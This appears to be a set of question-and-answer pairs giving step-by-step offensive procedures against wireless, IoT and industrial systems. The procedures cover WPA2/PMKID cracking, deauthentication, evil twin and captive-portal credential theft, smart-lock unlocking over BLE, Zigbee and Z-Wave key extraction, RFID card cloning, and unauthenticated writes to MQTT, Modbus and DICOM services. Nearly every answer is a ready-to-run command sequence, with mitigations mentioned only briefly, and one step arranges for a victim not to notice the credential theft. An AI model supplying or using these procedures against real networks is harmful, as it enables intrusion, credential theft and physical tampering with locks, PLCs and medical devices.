Walk me through a complete WPA2 handshake capture and offline crack.

Step 1 — Set monitor mode: airmon-ng check kill && airmon-ng start wlan0 → creates wlan0mon. Step 2 — Scan: airodump-ng wlan0mon to list networks, note BSSID and channel of target. Step 3 — Target capture: airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon to write capture file. Step 4 — Force handshake: aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon sends 5 deauth packets, forcing clients to reconnect and triggering handshake capture. Wait for 'WPA handshake' confirmation in airodump-ng. Step 5 — Crack: hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt for dictionary attack. Rules: hashcat -m 22000 capture.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule. Mask attack for patterns: hashcat -m 22000 -a 3 capture.hc22000 ?u?l?l?l?l?d?d?d?d. Pipal analysis of cracked passwords for pattern generation.

Explain the PMKID attack and how it differs from the 4-way handshake attack.

PMKID attack (discovered by Jens Steube, hashcat author, 2018) does NOT require capturing a 4-way handshake or deauthenticating clients. The PMKID is derived from the PMK: PMKID = HMAC-SHA1-128(PMK, 'PMK Name' || AP_MAC || Client_MAC). Since PMKID is broadcast in the first EAPOL frame from the AP, you only need to associate with the AP — no client needed. Tools: hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3 captures PMKIDs passively. hcxpcapngtool -o hashes.hc22000 capture.pcapng converts to hashcat format. hashcat -m 22000 hashes.hc22000 wordlist.txt for offline cracking. Advantage: works against any WPA2/WPA3 network with no active clients needed, works passively. Limitation: still requires password to be in wordlist/rules. Mitigation: long random passwords (20+ chars) make PMKID and handshake attacks computationally infeasible.

How do you set up an Evil Twin / rogue AP attack?

Evil Twin mimics a legitimate AP to capture credentials from connecting clients. Method 1 — hostapd-wpe (WPA Enterprise): for enterprise networks, captures RADIUS authentication attempts containing NTLMv2 hashes. Edit hostapd-wpe.conf with target SSID, channel, interface. Run: hostapd-wpe hostapd-wpe.conf. Hashes captured automatically when clients try to connect. Crack with hashcat -m 5500. Method 2 — Captive Portal (open networks): hostapd for AP, dnsmasq for DHCP/DNS, nginx serving fake login page. airbase-ng -e 'Target_WiFi' -c 6 wlan0mon creates soft AP. Route all DNS to attacker: iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53. Serve captive portal page. Method 3 — WiFi Pineapple: automates entire process with web UI, management AP, karma attack (responds to all probe requests). Wifiphisher automates credential capture with multiple phishing templates.

What is a deauthentication attack and how does it enable other attacks?

802.11 management frames including deauthentication are unauthenticated by default (pre-802.11w). An attacker can forge deauth frames spoofing the AP's MAC address, forcing all clients to disconnect. Command: aireplay-ng -0 0 -a AP_BSSID wlan0mon (continuous deauth). Targeted: aireplay-ng -0 10 -a AP_BSSID -c CLIENT_MAC wlan0mon. Attack enablers: 1) WPA2 handshake capture — forces reconnect which triggers 4-way handshake. 2) PMKID harvest — forces reassociation. 3) Evil Twin migration — deauth from real AP, client connects to stronger evil twin. 4) DoS — continuous deauth makes network unusable. 5) Credential capture — used with hostapd-wpe to force enterprise clients to authenticate against rogue RADIUS. 802.11w (Protected Management Frames) mitigates this but requires both AP and client support. Tools: mdk4 (more powerful deauth with filtering), Scapy for custom frame crafting.

How do you attack WPA3 networks?

WPA3 replaces PSK with SAE (Simultaneous Authentication of Equals / Dragonfly) which is resistant to offline dictionary attacks. Known attacks: 1) Dragonblood (2019, Vanhoef & Ronen): multiple vulnerabilities — Downgrade attack forces WPA2 mode if AP supports both. Cache-based side-channel: timing differences in SAE commit phase leak information about password. EAP-pwd side-channel: similar timing attacks. 2) Denial of Service: SAE is computationally expensive, attackers flood AP with SAE commit frames causing resource exhaustion. 3) Evil Twin still works: rogue AP serving WPA3-SAE, client connects, credential capture via EAP-TLS/captive portal. 4) If 192-bit security mode (WPA3-Enterprise) uses weak cipher suites, downgrade possible. Tool: dragonslayer (PoC for Dragonblood). Mitigation status: most Dragonblood fixed in 2019-2020 patches. Modern WPA3 with PMF mandatory + patched firmware is significantly harder to crack than WPA2.

Walk through a complete Bluetooth Low Energy (BLE) reconnaissance and attack.

BLE recon: 1) Passive scan: bluetoothctl → scan on (or hciconfig hci0 up && hcitool lescan). Captures advertised device names, MAC addresses, service UUIDs. For detailed: btlejuice or BTLE-Sniffer. 2) Active scan: gatttool -b DEVICE_MAC -I → connect → primary (lists services) → char-desc (lists characteristics). 3) Identify writable characteristics (properties include 'write'). 4) GATT attacks: gatttool -b MAC --char-write-req -a HANDLE -n VALUE to write arbitrary values. Attack scenarios: 1) Smart locks — find GATT characteristic controlling lock state, write unlock command. Many don't verify authentication for GATT writes. 2) Medical devices — insulin pumps, pacemakers have BLE interfaces with no authentication. 3) Fitness trackers — extract health data, spoof activity data. 4) BLE relay attack: btlejack captures BLE connection, rebroadcasts to extend range for proximity-based attacks. Tools: Ubertooth One for BLE sniffing, nRF Sniffer, Wireshark BLE dissector, BTLE-Juicer, Scapy BLE layer.

What are Zigbee security weaknesses and how are they exploited?

Zigbee (IEEE 802.15.4) is used in smart home devices, industrial sensors, building automation. Security issues: 1) Key management: uses a 128-bit AES network key but initial key exchange often uses default 'well-known' key (0x5A6967426565416C6C69616E63653039 = 'ZigBeeAlliance09'). Capture join process to get network key. 2) Frame replay: Zigbee has no replay protection in many implementations. 3) Network key broadcast: coordinator broadcasts network key to joining devices in plaintext if 'unsecured rejoin' allowed. Attack tools: KillerBee suite (Python) — zbdump for capture, zbgoodfind for key extraction, zbstumbler for network discovery. zbdump -i /dev/ttyUSB0 -w capture.pcap. Zbdump + Wireshark with Zigbee dissector. RZUSBstick or ApiMote hardware required. 4) Touchlink commissioning: factory reset attack — send Touchlink scan request near device, if it responds with network info, send factory reset command. Affects Philips Hue and other devices within ~10 meter range. Patched but many devices unpatched.

How do you attack RFID and NFC systems for cloning and access control bypass?

RFID/NFC attack categories by frequency: Low Frequency (125 kHz) — HID, EM410x cards — no encryption, trivially cloneable. Read with Proxmark3 or cheap USB reader: pm3 → lf search (auto-detect card type) → lf em 410x clone --id CARDID (write to T5577 writable card). High Frequency (13.56 MHz) — MIFARE Classic (most common), MIFARE DESFire, NTAG. MIFARE Classic attack: Proxmark3 → hf mf autopwn (automated attack using nested authentication vulnerability + hardcoded keys). Downloads all 16 sectors. Clone to magic card. MIFARE DESFire: much more secure, requires proper key management. NFC attacks: NFC relay — Proxmark3 client runs on two devices, one near reader one near card — extends range from 4cm to 100m+. Used for contactless payment relay. ACR122U for passive NFC reading. NFCGate for Android-based NFC relay. Access control bypass: 1) Read legitimate card. 2) Write to blank T5577 (LF) or magic MIFARE (HF). 3) Present cloned card.

Explain MQTT security vulnerabilities and how brokers are exploited.

MQTT is the dominant IoT messaging protocol — lightweight pub/sub over TCP port 1883 (1884 for WebSocket, 8883 for TLS). Security issues: 1) No authentication by default — most deployments use anonymous access. Connect with: mosquitto_sub -h target -p 1883 -t '#' -v subscribes to ALL topics and dumps everything. 2) Sensitive data in topics — common exposed topics: home/sensors/#, devices/+/status, factory/machine/temperature. 3) Control topics writable without auth: publish to actuator topics to control devices. mosquitto_pub -h target -t 'home/lights/livingroom' -m 'ON'. 4) MQTT over WebSocket exposed without TLS at ws://target:8083. 5) Shodan search: port:1883 to find exposed brokers. Common exposed data: GPS locations, temperature readings, industrial sensor data, home automation states. Attack: 1) Connect to broker. 2) Subscribe to # (all topics). 3) Analyze topic hierarchy for control topics. 4) Publish malicious commands to control topics. Tooling: MQTT Explorer GUI, mqtt-cli, MQTTfuzz for fuzzing.

How do you perform a Zigbee network key extraction attack?

Full Zigbee key extraction workflow: Hardware: RZUSBstick, ApiMote, or YARD Stick One. Software: KillerBee suite. Step 1 — Monitor mode: zbdump -i /dev/ttyUSB0 -w zigbee.pcap -c 11 (channel 11, scan 11-26 for active channel). Step 2 — Find active channel: zbstumbler -i /dev/ttyUSB0 to discover networks and channels. Step 3 — Capture join sequence: when a new device joins network, the coordinator sends network key. Reset a device to trigger rejoin. Step 4 — Key extraction: zbgoodfind -f zigbee.pcap --livefind checks for known default keys. If using default 'ZigBeeAlliance09' key, all traffic decryptable immediately. Step 5 — Decrypt in Wireshark: Edit → Preferences → Protocols → ZigBee → Add key. All ZigBee frames now shown decrypted. Step 6 — Replay attacks: zbassoc for device association, zbreplay for frame replay. Smart home impact: unlock smart locks, control smart bulbs, read environmental sensors, trigger alarms.

What are the main IoT firmware security vulnerabilities and how do you find them?

Systematic firmware analysis workflow: 1) Extract firmware (binwalk -e firmware.bin). 2) Credential hunting: grep -r 'password\|passwd\|secret\|token' squashfs-root/ — finds hardcoded credentials. firmwalker.sh automates this. 3) Binary analysis: find all executables: find . -executable -type f. Identify arch: file binary. Run checksec: checksec --file=binary — checks for NX, PIE, ASLR, stack canaries, RELRO. 4) Web interface analysis: find CGI scripts, check for command injection: grep -r 'system\|exec\|popen' www/cgi-bin/. 5) Configuration files: cat etc/passwd (check for root with no password), etc/shadow, etc/config/*. 6) Private keys: find . -name '*.key' -o -name '*.pem' -o -name id_rsa. 7) Debug interfaces: look for telnetd, dropbear, sshd in startup scripts. 8) Emulation: Firmadyne for full QEMU emulation, test web interface for command injection. Common vulns: hardcoded creds (CVE staple), command injection in web params, path traversal, buffer overflows in parsing code, default SSH keys shared across all devices of same model.

How does a captive portal attack work for credential harvesting?

Captive portal attack forces target to authenticate against a fake portal. Full setup: Hardware: two wireless interfaces — one for AP (wlan0), one for internet (wlan1 or eth0). Software stack: hostapd (AP), dnsmasq (DHCP/DNS), iptables (redirect), nginx (portal). Step 1 — Create AP: hostapd.conf with target SSID. Step 2 — DHCP: dnsmasq.conf giving clients 192.168.1.0/24 addresses, DNS pointing to attacker. Step 3 — DNS poisoning: dnsmasq redirects ALL DNS queries to attacker IP (dns-rr=*,192.168.1.1). Step 4 — iptables: redirect all HTTP to nginx: iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80. Step 5 — HTTPS interception: use sslstrip2 or captive-portal-bypass. Step 6 — Portal page: nginx serves convincing login page (ISP login, hotel WiFi, coffee shop). Log credentials to file. Step 7 — After capture: redirect to real internet (iptables MASQUERADE through wlan1) so victim doesn't notice. Wifiphisher automates this with pre-built templates.

Explain LoRaWAN security and known attack vectors.

LoRaWAN (Long Range Wide Area Network) operates at 868/915 MHz for IoT deployments with range up to 15km. Architecture: End Devices → Gateways → Network Server → Application Server. Security: Two session keys — NwkSKey (network, 128-bit AES) and AppSKey (application, 128-bit AES) derived from AppKey during join procedure. Vulnerabilities: 1) AppKey exposure — if AppKey leaked (hardcoded in firmware), all session keys derivable. 2) Join replay: OTAA join requests replayed if no replay protection. 3) Gateway compromise: gateways transmit all received frames to network server — compromised gateway reveals all device communications even if encrypted. 4) Bit flip attacks: no message integrity protection in some implementations. 5) ADR (Adaptive Data Rate) exploitation: attacker sends fake SNR reports to force device to reduce transmission power, limiting range. 6) Rogue gateway: cheap gateway captures all LoRa frames in range including join requests containing DevEUI, AppEUI. Tool: gr-lora (GNU Radio) for LoRa signal decode, LoRaWAN-simulator for protocol analysis.

How do you attack Z-Wave networks used in smart home systems?

Z-Wave is a proprietary 908.42 MHz (US) / 868.42 MHz (EU) mesh protocol for smart home. Security Levels: S0 (weak, all devices), S2 (current, strong). S0 vulnerabilities: 1) Network key transmitted in plaintext during inclusion pairing phase. Capture with HackRF + GNU Radio Z-Wave decoder, extract key, decrypt all traffic. 2) Key accepted from ANY controller — no authentication of controller identity. 3) Many legacy devices still use S0. S2 improvements: ECDH key exchange with DSK (Device Specific Key) verification, but: 4) User must manually verify 5-digit DSK during pairing — social engineering to get user to skip. Attack tools: EZ-Wave suite, gr-zwave (GNU Radio Z-Wave receiver), Z-Wave JS for protocol implementation. Physical attack: Z-Wave devices store keys in Flash — extract firmware, find NVM region containing network keys. Practical impact: Z-Wave doorbells, locks, alarm systems. S2 devices with proper pairing verification are significantly more secure than S0.

What are DICOM and industrial protocol OSINT and attack surfaces?

Industrial/medical protocols exposing attack surface: Modbus TCP (port 502): No authentication whatsoever. modbus-cli read --tcp target:502 holding-register 0 100 reads 100 registers. Write: modbus-cli write --tcp target:502 coil 0 1 turns on coil 0. Shodan search: port:502 to find exposed PLCs. BACnet (port 47808 UDP): Building automation (HVAC, elevators). bacnet-stack tools for enumeration. EtherNet/IP (port 44818): Rockwell/Allen-Bradley PLCs. cpppo (Python library) for read/write. DICOM (port 104): Medical imaging. dcmtk tools: echoscu target 104 (C-ECHO), findscu for patient data query, storescu to push malicious DICOM file. DICOM servers often have no authentication. OPC-UA (port 4840): Modern industrial protocol with security, but many deployments use no security mode. opcua-client-gui for enumeration. DNP3 (port 20000): Power grid SCADA. Shodan: port:20000 product:DNP3. Exploitation impact: modify setpoints on industrial processes, access patient records, unlock building systems.

Explain WiFi probe request reconnaissance and tracking.

Every WiFi-enabled device continuously broadcasts 'probe requests' containing the SSIDs of previously connected networks. This is passive and requires no connection. Capture: tcpdump -i wlan0mon type mgt subtype probe-req -w probes.pcap. Extract SSIDs: tshark -r probes.pcap -T fields -e wlan.sa -e wlan_mgt.ssid. What you learn: 1) Home network SSID: 'Smith_HomeNetwork' or ISP-default names reveal ISP and region. 2) Work networks: 'CompanyName_Corp', 'Office_WiFi'. 3) Travel history: hotel SSIDs, airport WiFi names, coffee shop names. 4) Personal data: 'John's iPhone Hotspot', custom SSID names revealing pet names, addresses. Tool: probemon (Python daemon), wigle.net (WiFi SSID geolocation database) — search captured SSID against WiGLE to geolocate where device has been. Phone privacy mitigations: iOS 14+ / Android 10+ use randomized MAC addresses in probe requests but the SSID list is still revealed. Counter: use VPN hotspot with random SSID, regularly forget old networks.

How do you exploit UPNP vulnerabilities on IoT networks?

UPnP (Universal Plug and Play) allows devices to automatically discover and communicate on a LAN. Attack surface: Port 1900 UDP (SSDP discovery) is often exposed externally on misconfigured routers. Tools: Miranda (Python UPnP toolkit), gssdp-tools, upnp-inspector. Discovery: msf > use auxiliary/scanner/upnp/ssdp_msearch or miranda.py → msearch. Exploitation: 1) Port forwarding: AddPortMapping action adds arbitrary NAT rules — expose internal services externally. miranda.py → host target → invoke → AddPortMapping. 2) Router admin bypass: some routers expose admin functions via UPnP without authentication. 3) Router DNS hijacking: SetDNSServer UPnP action available on some TP-Link, D-Link, ASUS routers — change DNS to attacker-controlled server for MitM. 4) SSRF via UPnP: send UPnP requests containing attacker URL — router fetches URL from internal network, enabling internal service enumeration. Shodan: upnp.friendly-name:'router' port:1900 finds exposed UPnP. CallStranger (CVE-2020-12695): UPnP SUBSCRIBE callback SSRF for DDoS amplification.

How does an IMSI catcher work and what data does it capture?

IMSI catchers (also known as Stingrays, cell-site simulators) mimic legitimate cell towers, forcing nearby phones to connect. Process: 1) Broadcast with stronger signal than real towers on GSM/UMTS/LTE frequencies. 2) Phones connect via IMSI attach request — IMSI number captured. 3) For GSM: downgrade attack forces 2G connection with no mutual authentication — device authenticates to tower but tower doesn't authenticate to device. 4) Capture IMSI, IMEI, MSISDN, location data. 5) In active mode: intercept voice calls and SMS (GSM only — UMTS/LTE have mutual authentication but can be downgraded). 6) Targeted operation: once target's IMSI known, track their location by measuring signal strength across multiple positions. Legal tool for law enforcement; illegal use in many jurisdictions. Detection: Android IMSI-Catcher Detector apps check for 2G downgrade, unusual tower parameters, missing encryption. SnoopSnitch app checks for network anomalies. Faraday cage blocks all signals. Technical countermeasure: end-to-end encrypted comms (Signal) unaffected by interception.
